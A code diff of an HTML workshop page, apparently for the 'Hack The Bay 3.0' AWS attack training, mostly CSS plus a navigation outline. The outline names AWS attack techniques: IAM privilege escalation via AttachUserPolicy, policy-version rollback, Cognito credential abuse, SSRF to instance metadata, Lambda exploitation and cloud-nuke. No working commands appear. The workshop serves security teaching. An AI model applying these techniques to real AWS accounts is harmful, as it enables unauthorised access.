@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hack The Bay 3.0 — AWS IAM Attack Demo</title>
+<title>Hack The Bay 3.0 — AWS Attack Workshop</title>
 <style>
 :root{--bg:#080c14;--bg2:#0f1520;--bg3:#1a2234;--bgt:#0b0f18;--bgs:#0a0f1a;--ov:rgba(0,0,0,.72);--g:#00e87b;--gd:#00b862;--r:#ff4757;--b:#4a90d9;--a:#f0a030;--p:#9b6dff;--cy:#22d3ee;--o:#f97316;--t1:#e2e8f0;--t2:#94a3b8;--tm:#64748b;--td:#3e4c63;--br:#1c2a3a;--br2:#2a3a4f;--mono:'SF Mono','Fira Code','Cascadia Code','JetBrains Mono','Consolas',monospace;--sans:-apple-system,BlinkMacSystemFont,'Segoe UI','Inter',system-ui,sans-serif;--rad:10px;--rads:6px;--sw:272px;--th:6px}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -42,12 +42,19 @@ code{font-family:var(--mono);background:var(--bg3);padding:1px 7px;border-radius
 .badge::before{content:'';width:18px;height:2px;background:var(--g)}
 .ptitle{font-size:40px;font-weight:800;line-height:1.12;margin-bottom:10px;letter-spacing:-.5px}
 .psub{font-size:18px;color:var(--t2);max-width:680px;margin-bottom:36px;line-height:1.55}
-h3{font-size:20px;font-weight:700;margin-bottom:14px}h4{font-size:16px;font-weight:700;margin-bottom:8px}
-.card{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:22px;transition:border-color .2s}.card:hover{border-color:var(--br2)}
-.cg{display:grid;gap:16px}.cg2{grid-template-columns:1fr 1fr}.cg3{grid-template-columns:1fr 1fr 1fr}
+h3{font-size:20px;font-weight:700;margin-bottom:14px}
+h4{font-size:16px;font-weight:700;margin-bottom:8px}
+.card{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:22px;transition:border-color .2s}
+.card:hover{border-color:var(--br2)}
+.cg{display:grid;gap:16px}.cg2{grid-template-columns:1fr 1fr}.cg3{grid-template-columns:1fr 1fr 1fr}.cg4{grid-template-columns:repeat(4,1fr)}
+.mc{background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);padding:24px;text-align:center;transition:all .2s}
+.mc:hover{border-color:rgba(0,232,123,.3);transform:translateY(-2px)}
+.mv{font-size:44px;font-weight:800;line-height:1;background:linear-gradient(135deg,var(--g),var(--cy));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.ml{font-size:13px;color:var(--tm);font-weight:500}
 .cpan{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px}
 .cp{padding:20px;border-radius:var(--rad);border:1px solid var(--br)}
-.cp.knows{background:rgba(74,144,217,.04);border-color:rgba(74,144,217,.2)}.cp.wants{background:rgba(255,71,87,.03);border-color:rgba(255,71,87,.2)}
+.cp.knows{background:rgba(74,144,217,.04);border-color:rgba(74,144,217,.2)}
+.cp.wants{background:rgba(255,71,87,.03);border-color:rgba(255,71,87,.2)}
 .cp-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px}
 .cp.knows .cp-label{color:var(--b)}.cp.wants .cp-label{color:var(--r)}
 .cp ul{list-style:none;font-size:14px;color:var(--t2)}.cp li{padding:3px 0 3px 16px;position:relative}.cp li::before{content:'›';position:absolute;left:0;color:var(--td)}
@@ -55,61 +62,92 @@ h3{font-size:20px;font-weight:700;margin-bottom:14px}h4{font-size:16px;font-weig
 .an{display:flex;flex-direction:column;align-items:center;gap:8px;padding:14px 16px;border-radius:var(--rad);border:1.5px solid var(--br);background:var(--bg);transition:all .3s;cursor:default;min-width:90px}
 .an:hover{transform:translateY(-3px);border-color:var(--b)}
 .an.vuln{border-color:rgba(255,71,87,.4)}.an.vuln:hover{border-color:var(--r)}
-.an .ai{width:40px;height:40px;display:flex;align-items:center;justify-content:center}.an .ai svg{width:32px;height:32px}
-.an-l{font-size:12px;font-weight:700;text-align:center}.an-s{font-size:10px;color:var(--td);text-align:center}
-.aarr{color:var(--td);font-size:20px;margin:0 8px;flex-shrink:0}.aarr.atk{color:var(--r)}
+.an .ai{width:40px;height:40px;display:flex;align-items:center;justify-content:center}
+.an .ai svg{width:32px;height:32px}
+.an-l{font-size:12px;font-weight:700;text-align:center}
+.an-s{font-size:10px;color:var(--td);text-align:center}
+.aarr{color:var(--td);font-size:20px;margin:0 8px;flex-shrink:0}
+.aarr.atk{color:var(--r)}
+.tb{border:2px dashed rgba(255,71,87,.25);border-radius:14px;padding:18px;position:relative;display:flex;align-items:center;gap:12px}
+.tb-label{position:absolute;top:-10px;left:18px;background:var(--bg2);padding:0 8px;font-size:10px;font-weight:700;color:var(--r);text-transform:uppercase;letter-spacing:1px}
 .term{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden;font-family:var(--mono);font-size:14px;line-height:1.7}
 .term.focus{border-color:var(--g);box-shadow:0 0 16px rgba(0,232,123,.06)}
 .th{display:flex;align-items:center;gap:7px;padding:10px 14px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--br)}
 .td{width:10px;height:10px;border-radius:50%}.td.r{background:#ff5f57}.td.y{background:#febc2e}.td.g{background:#28c840}
 .tt{font-size:11px;color:var(--td);margin-left:6px;font-family:var(--sans)}
-.tb2{padding:14px 18px;max-height:420px;overflow-y:auto;min-height:60px}
+.tb2{padding:14px 18px;max-height:380px;overflow-y:auto;min-height:60px}
 .tl{margin-bottom:1px;white-space:pre-wrap;word-break:break-all}
 .tl.cmd{color:var(--g)}.tl.cmd::before{content:'$ ';color:var(--gd)}
-.tl.out{color:var(--tm)}.tl.err{color:var(--r)}.tl.alrt{color:var(--r)}.tl.alrt::before{content:'[!] '}.tl.ok{color:var(--g)}.tl.ok::before{content:'[✓] '}.tl.inf{color:var(--b)}.tl.inf::before{content:'[*] '}
+.tl.out{color:var(--tm)}
+.tl.err{color:var(--r)}
+.tl.alrt{color:var(--r)}.tl.alrt::before{content:'[!] '}
+.tl.ok{color:var(--g)}.tl.ok::before{content:'[✓] '}
+.tl.inf{color:var(--b)}.tl.inf::before{content:'[*] '}
 .tl .jk{color:var(--cy)}.tl .js{color:var(--g)}.tl .jn{color:var(--a)}.tl .jb{color:var(--p)}
-.tp{display:flex;align-items:center;gap:0;margin-top:4px}.tp .ps{color:var(--gd);white-space:pre}
-.tpi{background:none;border:none;color:var(--g);font-family:var(--mono);font-size:14px;outline:none;flex:1;caret-color:var(--g);padding:0}.tpi::placeholder{color:var(--td);opacity:.5}
+.tp{display:flex;align-items:center;gap:0;margin-top:4px}
+.tp .ps{color:var(--gd);white-space:pre}
+.tpi{background:none;border:none;color:var(--g);font-family:var(--mono);font-size:14px;outline:none;flex:1;caret-color:var(--g);padding:0}
+.tpi::placeholder{color:var(--td);opacity:.5}
 .thint{padding:7px 14px;background:rgba(0,232,123,.03);border-top:1px solid var(--br);display:flex;align-items:center;gap:8px;font-size:11px;color:var(--td)}
 .thint .hk{background:var(--bg3);border:1px solid var(--br);border-radius:3px;padding:1px 5px;font-family:var(--mono);font-size:10px;color:var(--g)}
-.thint .hc{color:var(--g);font-family:var(--mono);cursor:pointer;text-decoration:underline;text-underline-offset:2px}.thint .hc:hover{color:#fff}
+.thint .hc{color:var(--g);font-family:var(--mono);cursor:pointer;text-decoration:underline;text-underline-offset:2px}
+.thint .hc:hover{color:#fff}
 .btn{display:inline-flex;align-items:center;gap:8px;padding:12px 28px;border-radius:var(--rads);font-size:14px;font-weight:700;cursor:pointer;border:none;transition:all .2s;font-family:var(--sans)}
 .btn1{background:var(--g);color:var(--bg)}.btn1:hover{box-shadow:0 0 20px rgba(0,232,123,.3);transform:translateY(-1px)}.btn1:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
 .btn2{background:transparent;color:var(--g);border:1px solid var(--g)}.btn2:hover{background:rgba(0,232,123,.06)}
+.btng{background:transparent;color:var(--tm);border:1px solid var(--br);padding:10px 18px;font-size:13px}.btng:hover{border-color:var(--g);color:var(--g)}
 .btns{padding:8px 16px;font-size:12px}
 .pulse{animation:pulseG 2.5s ease-in-out infinite}
 .tag{display:inline-block;padding:3px 10px;border-radius:16px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
-.tag-iam{background:rgba(74,144,217,.12);color:var(--b)}.tag-crit{background:rgba(255,71,87,.12);color:var(--r)}.tag-cog{background:rgba(249,115,22,.12);color:var(--o)}
+.tag-iam{background:rgba(74,144,217,.12);color:var(--b)}.tag-ec2{background:rgba(240,160,48,.12);color:var(--a)}.tag-lam{background:rgba(155,109,255,.12);color:var(--p)}.tag-s3{background:rgba(0,232,123,.08);color:var(--g)}.tag-cog{background:rgba(249,115,22,.12);color:var(--o)}.tag-crit{background:rgba(255,71,87,.12);color:var(--r)}.tag-home{background:rgba(155,109,255,.12);color:var(--p)}
 .fi{width:100%;padding:11px 14px;background:var(--bg3);border:1px solid var(--br);border-radius:var(--rads);color:var(--t1);font-size:14px;font-family:var(--mono);outline:none;transition:all .2s}
-.fi:focus{border-color:var(--g);box-shadow:0 0 8px rgba(0,232,123,.08)}.fi::placeholder{color:var(--td)}
+.fi:focus{border-color:var(--g);box-shadow:0 0 8px rgba(0,232,123,.08)}
+.fi.err{border-color:var(--r)}
+.fi::placeholder{color:var(--td)}
+.fsel{appearance:none;width:100%;padding:11px 14px;background:var(--bg3) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%2364748b'/%3E%3C/svg%3E") no-repeat right 14px center;border:1px solid var(--br);border-radius:var(--rads);color:var(--t1);font-size:14px;cursor:pointer;outline:none;transition:all .2s}
+.fsel:focus{border-color:var(--g)}
+.flbl{display:block;font-size:12px;font-weight:700;color:var(--tm);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}
+.ferr{font-size:11px;color:var(--r);margin-top:4px;display:none}.ferr.vis{display:block}
 .epan{padding:18px 20px;border-radius:var(--rad);border:1px solid rgba(255,71,87,.3);background:rgba(255,71,87,.04);margin:16px 0;display:none}
-.epan.vis{display:block;animation:fadeS .35s ease}.epan h4{color:var(--r);font-size:15px;margin-bottom:6px}.epan p{font-size:13px;color:var(--t2);line-height:1.5}
+.epan.vis{display:block;animation:fadeS .35s ease}
+.epan h4{color:var(--r);font-size:15px;margin-bottom:6px}
+.epan p{font-size:13px;color:var(--t2);line-height:1.5}
 .epan .fix{margin-top:10px;padding:10px 14px;background:rgba(0,232,123,.04);border:1px solid rgba(0,232,123,.15);border-radius:var(--rads);font-size:12px;color:var(--g)}
 .ocard{padding:16px;border:2px solid var(--br);border-radius:var(--rads);cursor:pointer;transition:all .2s;background:var(--bg2)}
-.ocard:hover{border-color:var(--b)}.ocard.sel{border-color:var(--g);background:rgba(0,232,123,.02)}.ocard.wrong{border-color:var(--r);background:rgba(255,71,87,.03)}
-.ocard .oct{font-weight:700;font-size:15px;margin-bottom:3px}.ocard .ocd{font-size:12px;color:var(--tm)}
+.ocard:hover{border-color:var(--b)}
+.ocard.sel{border-color:var(--g);background:rgba(0,232,123,.02)}
+.ocard.wrong{border-color:var(--r);background:rgba(255,71,87,.03)}
+.ocard .oct{font-weight:700;font-size:15px;margin-bottom:3px}
+.ocard .ocd{font-size:12px;color:var(--tm)}
 .pbox{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden}
 .phdr{padding:10px 14px;font-size:12px;font-weight:700;border-bottom:1px solid var(--br);text-transform:uppercase;letter-spacing:.8px}
 .phdr.safe{color:var(--b);background:rgba(74,144,217,.04)}.phdr.dng{color:var(--r);background:rgba(255,71,87,.04)}
 .pbdy{padding:14px 18px;font-family:var(--mono);font-size:13px;line-height:1.8;color:var(--tm)}
 .pbdy .jk{color:var(--cy)}.pbdy .js{color:var(--g)}.pbdy .jd{color:var(--r)}
 .cbox{background:var(--bgt);border:2px solid var(--a);border-radius:var(--rad);padding:20px;margin:16px 0;display:none}
-.cbox.vis{display:block;animation:flashI .3s ease}.cbox.dng{border-color:var(--r)}.cbox.ok{border-color:var(--g)}
+.cbox.vis{display:block;animation:flashI .3s ease}
+.cbox.dng{border-color:var(--r)}.cbox.ok{border-color:var(--g)}
 .cbox h4{font-size:15px;margin-bottom:6px}.cbox p{font-size:13px;color:var(--t2);margin-bottom:14px}
 .crow{display:flex;gap:10px;align-items:center}.crow input{flex:1}
 .fb{padding:16px 22px;border-radius:var(--rads);font-weight:700;font-size:16px;text-align:center;display:none;animation:flashI .4s ease}
-.fb.dng{background:rgba(255,71,87,.1);border:1px solid var(--r);color:var(--r)}.fb.ok{background:rgba(0,232,123,.06);border:1px solid var(--g);color:var(--g)}.fb.vis{display:block}
-.callout{padding:16px 20px;border-radius:var(--rad);border-left:3px solid;margin:16px 0;font-size:14px;line-height:1.55}
-.callout.insight{border-color:var(--b);background:rgba(74,144,217,.04);color:var(--t2)}
-.callout.warning{border-color:var(--a);background:rgba(240,160,48,.04);color:var(--t2)}
-.callout.danger{border-color:var(--r);background:rgba(255,71,87,.04);color:var(--t2)}
-.callout strong{color:var(--t1)}
-.why-box{padding:14px 18px;border-radius:var(--rad);background:rgba(74,144,217,.04);border:1px solid rgba(74,144,217,.15);margin:12px 0;font-size:13px;color:var(--t2);display:none}
-.why-box.vis{display:block;animation:fadeS .3s ease}.why-box strong{color:var(--b)}
-.split{display:grid;grid-template-columns:1fr 1fr;gap:20px}.swr{grid-template-columns:2fr 3fr}
-.pillar{padding:12px 18px;border-radius:var(--rads);font-size:14px;font-weight:600;border:1px solid var(--br);background:var(--bg2);margin-bottom:8px}
-.pillar .pnum{display:inline-block;width:24px;height:24px;border-radius:50%;background:var(--bg3);text-align:center;line-height:24px;font-size:12px;font-weight:800;margin-right:10px;color:var(--g)}
-.quote{font-size:20px;font-style:italic;color:var(--t1);line-height:1.5;padding:24px;border-left:4px solid var(--g);background:rgba(0,232,123,.02);border-radius:0 var(--rad) var(--rad) 0;margin:20px 0}
+.fb.dng{background:rgba(255,71,87,.1);border:1px solid var(--r);color:var(--r)}
+.fb.ok{background:rgba(0,232,123,.06);border:1px solid var(--g);color:var(--g)}
+.fb.vis{display:block}
+.cc{display:flex;align-items:center;justify-content:center;gap:0;padding:24px 0;overflow-x:auto}
+.cn{display:flex;flex-direction:column;align-items:center;gap:6px;opacity:0;transform:scale(.7);transition:all .5s cubic-bezier(.34,1.56,.64,1)}
+.cn.vis{opacity:1;transform:scale(1)}
+.cib{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;border:2px solid;font-size:16px;font-weight:800}
+.cl{font-size:11px;color:var(--tm);font-weight:600;text-align:center;max-width:80px}
+.ca{font-size:20px;color:var(--td);margin:0 6px;opacity:0;transition:opacity .3s}.ca.vis{opacity:1}
+.ceditor{background:var(--bgt);border:1px solid var(--br);border-radius:var(--rad);overflow:hidden}
+.ceditor-h{display:flex;align-items:center;gap:8px;padding:9px 14px;background:rgba(255,255,255,.02);border-bottom:1px solid var(--br);font-size:12px;color:var(--td)}
+.ceditor-b{padding:14px 18px;font-family:var(--mono);font-size:13px;line-height:1.8;overflow-x:auto}
+.ceditor-b .kw{color:var(--p)}.ceditor-b .fn{color:var(--b)}.ceditor-b .st{color:var(--g)}.ceditor-b .vr{color:var(--cy)}
+.ni{display:flex;align-items:center;gap:14px;padding:10px 0}
+.nlbl{width:170px;font-size:13px;font-weight:600}
+.nbg{flex:1;height:7px;background:var(--bg3);border-radius:4px;overflow:hidden}
+.nf{height:100%;width:0;border-radius:4px;transition:width 1.2s cubic-bezier(.4,0,.2,1);background:linear-gradient(90deg,var(--r),var(--a))}
+.ns{width:28px;text-align:center;font-size:16px}
 .kcg{display:flex;flex-direction:column;gap:0;padding:16px 0}
 .kcp{display:flex;align-items:stretch;gap:0;opacity:0;transform:translateX(-16px);transition:all .6s cubic-bezier(.34,1.56,.64,1)}
 .kcp.vis{opacity:1;transform:translateX(0)}
@@ -118,427 +156,428 @@ h3{font-size:20px;font-weight:700;margin-bottom:14px}h4{font-size:16px;font-weig
 .kcd{width:11px;height:11px;border-radius:50%;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);border:2px solid var(--bg)}
 .kcc{flex:1;padding:12px 18px;background:var(--bg2);border:1px solid var(--br);border-radius:var(--rads);margin:5px 0}
 .kcc h4{font-size:15px;font-weight:700;margin-bottom:3px}.kcc p{font-size:12px;color:var(--tm)}
-.ph-r .kcln::before,.ph-r .kcd{background:var(--b)}.ph-e .kcln::before,.ph-e .kcd{background:var(--a)}.ph-s .kcln::before,.ph-s .kcd{background:var(--r)}
+.ph-r .kcln::before,.ph-r .kcd{background:var(--b)}
+.ph-e .kcln::before,.ph-e .kcd{background:var(--a)}
+.ph-s .kcln::before,.ph-s .kcd{background:var(--r)}
+.ph-x .kcln::before,.ph-x .kcd{background:var(--p)}
+.ph-i .kcln::before,.ph-i .kcd{background:var(--r)}
+.mov{position:fixed;inset:0;background:var(--ov);z-index:2500;display:none;align-items:center;justify-content:center;opacity:0;transition:opacity .3s}
+.mov.vis{display:flex;opacity:1}
+.mod{background:var(--bg2);border:1px solid var(--br);border-radius:14px;width:520px;max-width:90vw;max-height:85vh;overflow-y:auto;box-shadow:0 20px 50px rgba(0,0,0,.5);animation:modI .3s ease}
+.mod-h{padding:22px 24px 0;display:flex;align-items:flex-start;justify-content:space-between}
+.mod-h h2{font-size:22px;font-weight:800}
+.mod-x{background:none;border:none;color:var(--td);font-size:22px;cursor:pointer;padding:4px;line-height:1}
+.mod-x:hover{color:var(--t1)}
+.mod-b{padding:16px 24px 24px}
+.mod-f{padding:14px 24px;border-top:1px solid var(--br);display:flex;justify-content:flex-end;gap:10px}
 .toast-c{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:3000;display:flex;flex-direction:column;gap:6px;align-items:center}
 .toast{padding:12px 22px;border-radius:var(--rads);font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px;animation:toastI .3s ease,toastO .3s ease 3.7s forwards;box-shadow:0 8px 24px rgba(0,0,0,.4)}
 .toast.info{background:var(--b);color:#fff}.toast.success{background:var(--g);color:var(--bg)}.toast.warning{background:var(--a);color:var(--bg)}.toast.error{background:var(--r);color:#fff}
+.callout{padding:16px 20px;border-radius:var(--rad);border-left:3px solid;margin:16px 0;font-size:14px;line-height:1.55}
+.callout.insight{border-color:var(--b);background:rgba(74,144,217,.04);color:var(--t2)}
+.callout.warning{border-color:var(--a);background:rgba(240,160,48,.04);color:var(--t2)}
+.callout.danger{border-color:var(--r);background:rgba(255,71,87,.04);color:var(--t2)}
+.callout.success{border-color:var(--g);background:rgba(0,232,123,.03);color:var(--t2)}
+.callout strong{color:var(--t1)}
+.why-box{padding:14px 18px;border-radius:var(--rad);background:rgba(74,144,217,.04);border:1px solid rgba(74,144,217,.15);margin:12px 0;font-size:13px;color:var(--t2);display:none}
+.why-box.vis{display:block;animation:fadeS .3s ease}
+.why-box strong{color:var(--b)}
+.ptabs{display:flex;gap:3px;margin-bottom:18px}
+.ptab{padding:9px 18px;border-radius:var(--rads) var(--rads) 0 0;font-size:13px;font-weight:700;cursor:pointer;background:var(--bg2);color:var(--td);border:1px solid var(--br);border-bottom:none;transition:all .2s}
+.ptab.act{background:var(--bgt);color:var(--g);border-color:var(--g)}
+.pcont{display:none}.pcont.act{display:block}
+.split{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.swr{grid-template-columns:2fr 3fr}
+.principal-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin:20px 0}
+.principal-card{text-align:center;padding:16px 8px;border:1px solid var(--br);border-radius:var(--rad);background:var(--bg2)}
+.principal-card .p-icon{font-size:28px;margin-bottom:6px}
+.principal-card .p-name{font-size:13px;font-weight:700}
+.principal-card .p-desc{font-size:11px;color:var(--td);margin-top:4px}
+.eval-flow{display:flex;align-items:center;gap:12px;padding:20px;background:var(--bg2);border:1px solid var(--br);border-radius:var(--rad);margin:16px 0;flex-wrap:wrap}
+.eval-step{padding:12px 16px;border-radius:var(--rads);text-align:center;font-size:13px;font-weight:700;min-width:140px}
+.eval-step.deny{background:rgba(255,71,87,.1);border:1px solid rgba(255,71,87,.3);color:var(--r)}
+.eval-step.allow{background:rgba(0,232,123,.06);border:1px solid rgba(0,232,123,.2);color:var(--g)}
+.eval-step.default{background:rgba(100,116,139,.1);border:1px solid rgba(100,116,139,.3);color:var(--tm)}
+.eval-arrow{color:var(--td);font-size:18px}
+.misconfig-detail{display:none;margin-top:12px;padding:14px;background:var(--bg3);border-radius:var(--rads);font-size:13px;color:var(--t2)}
+.misconfig-detail.vis{display:block;animation:fadeS .3s ease}
 .mt-8{margin-top:8px}.mt-12{margin-top:12px}.mt-16{margin-top:16px}.mt-20{margin-top:20px}.mt-24{margin-top:24px}.mt-30{margin-top:30px}
 .mb-8{margin-bottom:8px}.mb-12{margin-bottom:12px}.mb-16{margin-bottom:16px}.mb-20{margin-bottom:20px}.mb-24{margin-bottom:24px}
 .tc{text-align:center}
-.aws-iam{color:var(--b)}.aws-cog{color:var(--o)}
+.aws-iam{color:var(--b)}.aws-ec2{color:var(--a)}.aws-lam{color:var(--p)}.aws-s3{color:var(--g)}.aws-cog{color:var(--o)}.aws-nk{color:var(--r)}
 @keyframes pulseG{0%,100%{box-shadow:0 0 6px rgba(0,232,123,.15)}50%{box-shadow:0 0 22px rgba(0,232,123,.45)}}
 @keyframes flashI{0%{opacity:0;transform:scale(.96)}100%{opacity:1;transform:scale(1)}}
 @keyframes fadeS{0%{opacity:0;transform:translateY(12px)}100%{opacity:1;transform:translateY(0)}}
+@keyframes modI{0%{opacity:0;transform:scale(.92) translateY(16px)}100%{opacity:1;transform:scale(1) translateY(0)}}
 @keyframes toastI{0%{opacity:0;transform:translateY(16px)}100%{opacity:1;transform:translateY(0)}}
 @keyframes toastO{0%{opacity:1}100%{opacity:0;transform:translateY(-8px)}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.shake{animation:shake .3s ease}
+.pillar{padding:12px 18px;border-radius:var(--rads);font-size:14px;font-weight:600;border:1px solid var(--br);background:var(--bg2);margin-bottom:8px}
+.pillar .pnum{display:inline-block;width:24px;height:24px;border-radius:50%;background:var(--bg3);text-align:center;line-height:24px;font-size:12px;font-weight:800;margin-right:10px;color:var(--g)}
+.quote{font-size:20px;font-style:italic;color:var(--t1);line-height:1.5;padding:24px;border-left:4px solid var(--g);background:rgba(0,232,123,.02);border-radius:0 var(--rad) var(--rad) 0;margin:20px 0}
 </style>
 </head>
 <body>
 <div id="topbar"><div id="topbar-fill"></div></div>
 <div class="toast-c" id="tc"></div>
+<div class="mov" id="mov"><div class="mod" id="mod"></div></div>
 <div id="sidebar"></div>
 <div id="main"></div>
 <script>
-const ISVG=`<svg viewBox="0 0 40 40"><path d="M20 4L6 12v16l14 8 14-8V12L20 4z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="18" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M14 28c0-3.3 2.7-6 6-6s6 2.7 6 6" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
-const CSVG=`<svg viewBox="0 0 40 40"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M13 28c0-3.9 3.1-7 7-7s7 3.1 7 7" fill="none" stroke="currentColor" stroke-width="2"/></svg>`;
+const ISVG=`<svg viewBox="0 0 40 40"><path d="M20 4L6 12v16l14 8 14-8V12L20 4z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="18" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M14 28c0-3.3 2.7-6 6-6s6 2.7 6 6" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
+ESVG=`<svg viewBox="0 0 40 40"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="20" r="6" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
+LSVG=`<svg viewBox="0 0 40 40"><path d="M8 32L16 8h4l5 14h-4l3 10H8z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M24 22l8-14h-4" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
+SSVG=`<svg viewBox="0 0 40 40"><ellipse cx="20" cy="12" rx="12" ry="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8 12v16c0 2.2 5.4 4 12 4s12-1.8 12-4V12" fill="none" stroke="currentColor" stroke-width="2"/><ellipse cx="20" cy="20" rx="12" ry="4" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
+CSVG=`<svg viewBox="0 0 40 40"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="20" cy="16" r="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M13 28c0-3.9 3.1-7 7-7s7 3.1 7 7" fill="none" stroke="currentColor" stroke-width="2"/></svg>`,
+NSVG=`<svg viewBox="0 0 40 40"><circle cx="20" cy="20" r="12" fill="none" stroke="currentColor" stroke-width="2"/><line x1="12" y1="12" x2="28" y2="28" stroke="currentColor" stroke-width="2"/><line x1="28" y1="12" x2="12" y2="28" stroke="currentColor" stroke-width="2"/></svg>`;
 
-// ═══ NAV: Maps exactly to your 20-min talk ═══
 const NAV=[
-{id:'intro',label:'Your Intro',n:'0',ch:[
-  {id:'title',label:'Title'},
-  {id:'perimeter',label:'Identity is the Perimeter'},
-  {id:'pillars',label:'5 Pillars'}
-]},
-{id:'atk1',label:'Attack 1: IAM Priv Esc',n:'1',ch:[
-  {id:'a1-scenario',label:'Scenario'},
-  {id:'a1-discover',label:'Discovery'},
-  {id:'a1-exploit',label:'Escalation'},
-  {id:'a1-graph',label:'Graph View'},
-  {id:'a1-takeaway',label:'Takeaway'}
-]},
-{id:'atk2',label:'Attack 2: Rollback',n:'2',ch:[
-  {id:'a2-scenario',label:'Scenario'},
-  {id:'a2-versioning',label:'Policy Versioning'},
-  {id:'a2-discover',label:'Discovery'},
-  {id:'a2-exploit',label:'The Rollback'},
-  {id:'a2-takeaway',label:'Takeaway'}
-]},
-{id:'atk3',label:'Attack 3: Cognito',n:'3',ch:[
-  {id:'a3-what',label:'What is Cognito'},
-  {id:'a3-trust',label:'Trust Model'},
-  {id:'a3-exploit',label:'The Exploit'},
-  {id:'a3-takeaway',label:'Takeaway'}
-]},
-{id:'wrap',label:'Wrap + Handoff',n:'✓'}
+{id:'1',label:'Summary',n:'1'},
+{id:'2',label:'Introduction',n:'2'},
+{id:'3',label:'Pre-Reqs',n:'3'},
+{id:'4',label:'AWS Accounts',n:'4',ch:[{id:'4.1',label:'Console Access'},{id:'4.2',label:'Create IAM User'},{id:'4.3',label:'CLI Access'}]},
+{id:'5',label:'Student Environment',n:'5',ch:[{id:'5.1',label:'Script Setup'},{id:'5.2',label:'Console Setup'},{id:'5.3',label:'Timezone Errors'}]},
+{id:'6',label:'Attack Surface',n:'6'},
+{id:'7',label:'AWS IAM',n:'7',ch:[{id:'7.0',label:'IAM Deep Dive'},{id:'7.0b',label:'Policy Evaluation'},{id:'7.1',label:'6 Misconfig Categories'},{id:'7.1a',label:'Attack 1 — Scenario'},{id:'7.1b',label:'Attack 1 — Exploit'},{id:'7.2',label:'Attack 2 — Scenario'},{id:'7.3',label:'Attack 2 — Exploit'},{id:'7.4a',label:'Attack 3 — Cognito'},{id:'7.4',label:'Attack 3 — Exploit'}]},
+{id:'8',label:'Cloud Compute',n:'8',ch:[{id:'8.0',label:'EC2 & IMDS'},{id:'8.1',label:'SSRF Exploitation'}]},
+{id:'9',label:'Serverless',n:'9',ch:[{id:'9.0',label:'Lambda Architecture'},{id:'9.1',label:'Lambda Exploit'}]},
+{id:'10',label:'Cloud-Nuke',n:'10',ch:[{id:'10.0',label:'Nuke Execution'}]},
+{id:'11',label:'Kill Chain',n:'11'}
 ];
 const FLAT=[];NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>FLAT.push(c.id));else FLAT.push(s.id)});
 const PAR={};NAV.forEach(s=>{if(s.ch)s.ch.forEach(c=>PAR[c.id]=s.id)});
-const ACC={
-'title':{d:'none',l:'No Access',b:''},'perimeter':{d:'none',l:'No Access',b:''},'pillars':{d:'none',l:'No Access',b:''},
-'a1-scenario':{d:'limited',l:'dev-user',b:'Limited IAM'},'a1-discover':{d:'limited',l:'dev-user',b:'iam:AttachUserPolicy *'},'a1-exploit':{d:'admin',l:'FULL ADMIN',b:'AdministratorAccess attached'},'a1-graph':{d:'admin',l:'FULL ADMIN',b:''},'a1-takeaway':{d:'admin',l:'FULL ADMIN',b:''},
-'a2-scenario':{d:'limited',l:'raynor',b:'Read-only IAM'},'a2-versioning':{d:'limited',l:'raynor',b:'SetDefaultPolicyVersion'},'a2-discover':{d:'limited',l:'raynor',b:'Enumerating versions'},'a2-exploit':{d:'admin',l:'FULL ADMIN',b:'Rolled back to v1'},'a2-takeaway':{d:'admin',l:'FULL ADMIN',b:''},
-'a3-what':{d:'none',l:'Anonymous',b:'No credentials'},'a3-trust':{d:'none',l:'Anonymous',b:''},'a3-exploit':{d:'auth',l:'Unauth → AWS Creds',b:'Cognito issued temp creds'},'a3-takeaway':{d:'auth',l:'AWS Creds Obtained',b:''},
-'wrap':{d:'admin',l:'3 Attacks Complete',b:'Identity is the perimeter'}
